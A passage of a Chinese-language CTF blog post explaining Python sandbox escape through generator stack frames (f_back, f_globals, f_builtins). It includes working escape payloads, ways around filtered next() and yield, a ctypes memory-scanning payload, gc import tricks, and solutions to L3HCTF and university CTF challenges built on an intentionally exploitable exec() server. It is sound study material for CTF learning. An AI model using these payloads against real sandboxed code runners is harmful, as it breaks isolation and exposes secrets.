class="line"></span><br><span class="line">(<span class="number">2</span>)那么如何更改内置函数，就像L3HCTF那道题payload，可以自己定义一个来更改后赋值即可。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看了一下栈帧的属性，试一下<code>f_builtins</code>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins.<span class="built_in">str</span>  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line">AttributeError: <span class="string">&#x27;dict&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<p>有点奇怪，问了一下，原因大概如下：</p>
<ul>
<li><p><code>f_globals</code>是一个字典，包含了当前帧的全局变量。我们可以通过键来访问这个字典中的元素。在上一个代码中，<code>c.f_globals[&#39;__builtins__&#39;]</code>访问的是全局变量的一部分<code>__builtins__</code>，它指向内置命名空间，这个命名空间本身可以是一个模块或者一个字典，这取决于它是在交互式解释器中使用还是在一个脚本中。在大多数情况下，<code>__builtins__</code>是一个模块对象，你可以直接通过属性访问方式获取内置函数，如<code>.str</code>。</p>
</li>
<li><p><code>f_builtins</code>属性通常是一个对应内置命名空间的字典。这意味着，尽管它包含了所有的内置对象，但你不能使用属性访问方式来获取它们，因为字典不支持通过属性来访问键值，而是应该使用字典的键来访问。因此，你不能写<code>c.f_builtins.str</code>来获取<code>str</code>函数，而应该写<code>c.f_builtins[&#39;str&#39;]</code>。</p>
</li>
</ul>
<p>对于这里的理解可以尝试和ssti的继承链结合，这样就好理解了，所以我们这里需要改，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins[<span class="string">&#x27;str&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;  </span><br></pre></td></tr></table></figure>

<p>成功获取到,由此可以进行后续操作</p>
<h3 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h3><p>原理就是通过生成器的栈帧对象再来使用f_back来返回前一帧从而逃逸出去获取globals全部变量（builtins同理）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>此时可以得到全局变量<code>secret</code>的值，</p>
<p><strong>解读一下</strong></p>
<p>看了这个示例代码后，思考了一下流程，我改了一下，用如下测试代码看这是如何进行换帧的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x00000247258E87D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000024725B08AE0</span>, file <span class="string">&#x27;D:\\clx\\ceshi.py&#x27;</span>, line <span class="number">13</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再改一点点：</span><br><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_back  <span class="comment">#只有这里被改了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DD5A3689E0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DD5A4D8AE0</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">12</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>稍微说明一下（个人理解）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1对应 def f():</span><br><span class="line">    这一部分</span><br><span class="line">    </span><br><span class="line">2就已经通过f()函数里面的f_back进入到了全局变量这一帧</span><br><span class="line">3就可以获得全局变量了。</span><br></pre></td></tr></table></figure>

<p>这里注意：看两个代码的output在3的区别，结合第二串代码如果在改的那里改为<code>frame.f_back.f_back</code>会报错，</p>
<p><strong>可以得出一个结论</strong>：当使用最后一个<code>f_back</code>输出为None时，此时就这个帧已经对应到全局帧，可以直接利用。</p>
<p><strong>现在来解析一下之前给的示例</strong>，按照我原先的理解，我会认为<code>f_back</code>会多一个，一直想不清楚。向baicany大哥请教了一下，悟了：</p>
<p><strong>这个<code>exec</code>在执行时会创建一个环境，所以还需要在调用一个<code>f_back</code>逃逸从而去到全局那一帧。</strong></p>
<p>我们来改一下代码看结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()  #生成器</span></span><br><span class="line"><span class="string">print(&#x27;1:&#x27;)</span></span><br><span class="line"><span class="string">print(g)</span></span><br><span class="line"><span class="string">frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">print(&#x27;2:&#x27;)</span></span><br><span class="line"><span class="string">print(frame)</span></span><br><span class="line"><span class="string">f = frame.f_back</span></span><br><span class="line"><span class="string">print(&#x27;3:&#x27;)</span></span><br><span class="line"><span class="string">print(f)</span></span><br><span class="line"><span class="string">d=f.f_globals[&#x27;s3cret&#x27;]</span></span><br><span class="line"><span class="string">print(&#x27;4:&#x27;)</span></span><br><span class="line"><span class="string">print(d)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(codes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DE562387D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409760</span>, file <span class="string">&#x27;&lt;string&gt;&#x27;</span>, line <span class="number">10</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">21</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">4</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>

<p>看结果，可以看出成功出来了，😭，本来想到是函数问题了，但在示例中最后那里调用了几个函数我就把这个问题排除了，<strong>exec()特殊</strong>！！！</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="过滤函数next"><a href="#过滤函数next" class="headerlink" title="过滤函数next()"></a>过滤函数next()</h5><p>即命名空间这样设置：<code>&#123;&#39;__builtins__&#39;: None&#125;</code>，这就导致了内置函数<code>next()</code>不能使用</p>
<p><strong>（1）</strong>可以使用for循环,这里是采用的列表推导式，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next(g) ==&gt; [x for x in g][0]</span><br></pre></td></tr></table></figure>

<p>但是注意，这里使用for循环来获取生成器对象会增加一个栈帧，所以需要再加一个<code>f_back</code>。</p>
<p><strong>（2）<code>send()</code>函数</strong></p>
<p>可以通过send()给生成器传递数据，调用<code>send()</code>后，就不用再调用了<code>next()</code>了。</p>
<p>直接给测试代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = g.send(<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001F30C930E40</span>&gt;</span><br><span class="line">&lt;frame at <span class="number">0x000001F30C527800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到已经逃逸到了全局空间。这里就是需要注意调用<code>send()</code>函数的格式和函数参数</p>
<h5 id="过滤yield-关键字"><a href="#过滤yield-关键字" class="headerlink" title="过滤yield 关键字"></a>过滤yield 关键字</h5><p>正好前面提到了变形的列表推导式也可以当做yield关键字来定义生成器，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">这两个相当于</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>:</span><br><span class="line">    <span class="keyword">yield</span> </span><br><span class="line">g=a()</span><br></pre></td></tr></table></figure>

<p>给个代码来对比一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">a=(a.gi_frame.f_back <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">frame = <span class="built_in">next</span>(a) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">d=frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000022469D6D630</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000022469CC8B40</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>

<p><code>[1]</code>可以换成<code>range(1)</code>，同样绕过方法可以组合起来用，注意<code>f_back</code>个数即可。</p>
<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><h5 id="L3HCTF-2024-intractable-problem-revenge"><a href="#L3HCTF-2024-intractable-problem-revenge" class="headerlink" title="L3HCTF 2024 -intractable problem revenge"></a>L3HCTF 2024 -intractable problem revenge</h5><p>暂时没找到复现环境，payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorization</span>(<span class="params">n</span>):</span><br><span class="line">    a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">globals</span>=a.f_back.f_back.f_globals</span><br><span class="line">    builtin = <span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span> + <span class="string">&quot;_builtins_&quot;</span> + <span class="string">&quot;_&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fakeint</span>(<span class="params">i</span>):</span><br><span class="line">        <span class="keyword">if</span>(builtin.<span class="built_in">len</span>(i)&gt;<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span>*<span class="number">123123</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span></span><br><span class="line"></span><br><span class="line">    builtin.<span class="built_in">int</span>=fakeint</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>简单看了一下，逃逸过后进入到全局变量来改函数</p>
<p>L3HCTF官方wp：<code>https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c</code></p>
<h5 id="第九届中国海洋大学-菜狗工具-2"><a href="#第九届中国海洋大学-菜狗工具-2" class="headerlink" title="第九届中国海洋大学-菜狗工具#2"></a>第九届中国海洋大学-菜狗工具#2</h5><p>题目描述：小王经过上次的惨痛教训后深刻反思，得出了解决不了 flag 泄露就解决 flag 本身的办法 这次你能拿到 flag 吗？</p>
<p>——————————————</p>
<p>附件内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;DISPOSED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># current source file is deleted</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br></pre></td></tr></table></figure>

<p>这道题的提交按钮被disables了，删了就能提交了</p>
<p>直接用栈帧逃逸打吧，这道题对于栈帧逃逸的关键字没得过滤，可以直接用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> a.gi_frame.f_back</span><br><span class="line">	</span><br><span class="line">a=haha()</span><br><span class="line">c=<span class="built_in">next</span>(a)</span><br><span class="line">d=c.f_back.f_globals[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605224858187.png" alt="image-20240605224858187"></p>
<h6 id="ctypes模块"><a href="#ctypes模块" class="headerlink" title="ctypes模块"></a>ctypes模块</h6><p>但是这里的flag被删除了，不会了，看下<strong>晨曦师傅的做法</strong></p>
<p>思路：题目环境在 chroot jail 中，没有 &#x2F;proc 目录，不能通过读文件的方式读内存，但是</p>
<p><strong>可以利用<code>ctypes</code>模块的指针</strong>，将flag地址周围的值读一下，实现一个从内存读源码的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">b = frame.f_back.f_globals</span><br><span class="line">flag_id=<span class="built_in">id</span>(b[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">ctypes = b[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"><span class="comment">#print(ctypes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">	txt = ctypes.cast((flag_id-<span class="number">8</span>*i),ctypes.c_char_p).value</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">		<span class="built_in">print</span>(txt)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>学习一下wp：</p>
<p>主要关注两个部分，如下：</p>
<ul>
<li><code>id()</code>函数：返回对象的内存地址，<a href="https://blog.csdn.net/zhuzuwei/article/details/80554776">参考文章</a></li>
<li><code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code></li>
</ul>
<p>将第二个拆分解答</p>
<ul>
<li><p><code>ctypes.cast(address, type)</code> 函数将一个地址转换为指定类型的指针。在这里是将一个地址转换为指定类型的指针。</p>
</li>
<li><p><code>ctypes.c_char_p</code>是ctypes类的数据，表示 C 风格的 <code>char *</code> 指针，用于指向字符串。</p>
</li>
<li><p><code>flag_id-8*</code>，那随便输入两个变量套一个id()就可以看看两个变量的地址差值，尝试了一下，完全符合，晨曦师傅tql</p>
</li>
</ul>
<p>结合起来，<code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code>，可以参考<a href="https://blog.csdn.net/jhsxy2005/article/details/114371993">文章</a></p>
<p>这就是读取对应内存地址的值的构造方法，<strong>那么为什么是<code>flag_id-8*i</code>，个人想法</strong>（应该没有错吧）：</p>
<p>当前<code>flag_id</code>对应<code>DISPOSED</code>，同时已知这个真实flag是先被赋值了的，说明真实flag的内存是在前面，所以这里是<code>-</code>，向前推进。</p>
<p>然后最后匹配到就输出flag。精妙精妙，学到了学到了。</p>
<h6 id="gc模块"><a href="#gc模块" class="headerlink" title="gc模块"></a><code>gc</code>模块</h6><p>由于过滤了<code>__import__</code>，这里要自己找一个能加载模块的类</p>
<p>最后选择了<code>_frozen_importlib.BuiltinImporter</code>这个可以导入内置模块的查找器,<a href="https://blog.csdn.net/jeffery0207/article/details/120612313">参考文章</a></p>
<p><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())</span><br></pre></td></tr></table></figure>



<p>让gpt改了一下，本地利用的方式为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _frozen_importlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入的模块名称</span></span><br><span class="line">module_name = <span class="string">&#x27;gc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用BuiltinImporter导入模块</span></span><br><span class="line">loaded_module = _frozen_importlib.BuiltinImporter.load_module(module_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块内容</span></span><br><span class="line"><span class="built_in">print</span>(loaded_module)</span><br><span class="line"><span class="built_in">print</span>(loaded_module.get_objects())</span><br></pre></td></tr></table></figure>



<h6 id="官方的做法"><a href="#官方的做法" class="headerlink" title="官方的做法"></a>官方的做法</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line">io = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;io&#x27;</span>)</span><br><span class="line">dis = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;dis&#x27;</span>)</span><br><span class="line">threading = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())     <span class="comment">#获取所有活跃线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread())    <span class="comment">#获取主线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread().ident)   <span class="comment"># 获取主线程标识符</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames())      <span class="comment"># 获取所有线程的堆栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="comment">#获取到主线程的堆栈帧对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = sys._current_frames()[threading.main_thread().ident]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> frame <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	out = io.StringIO()     <span class="comment"># 内存创建字符串I/O流</span></span><br><span class="line">	dis.dis(frame.f_code,file=out)   <span class="comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span></span><br><span class="line">	content = out.getvalue()    <span class="comment">#获取反汇编的结果</span></span><br><span class="line">	out.close()</span><br><span class="line">	<span class="built_in">print</span>(content)</span><br><span class="line">	frame = frame.f_back</span><br></pre></td></tr></table></figure>

<p>这里因为源码里对flag重复赋值了一次导致直接查app.py的<code>f_globals</code>得不到flag</p>
<p>需要对其栈帧进行反汇编拿到初次赋值的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out = io.StringIO()     # 内存创建字符串I/O流</span><br><span class="line">dis.dis(frame.f_code,file=out)   # 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br><span class="line">content = out.getvalue()    #获取反汇编的结果</span><br><span class="line">out.close()</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p>分析可看参考文章</p>
<p>文章：<code>https://chenxi9981.github.io/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/</code></p>
<p><code>https://c1oudfl0w0.github.io/blog/2024/04/24/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/#gc%E8%A7%A3%E6%B3%95</code></p>
<h5 id="CISCN-2024-–mossfern"><a href="#CISCN-2024-–mossfern" class="headerlink" title="CISCN 2024 –mossfern"></a>CISCN 2024 –mossfern</h5><p>题目描述：<br>小明最近搭建了一个学习 Python 的网站，他上线了一个 Demo。据说提供了很火很安全的在线执行功能，你能帮他测测看吗？</p>
<p>——————————————————</p>
<p>在ctfshow上可以复现，但是没有前端，不想去复现，给了附件：</p>
<p>main.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span 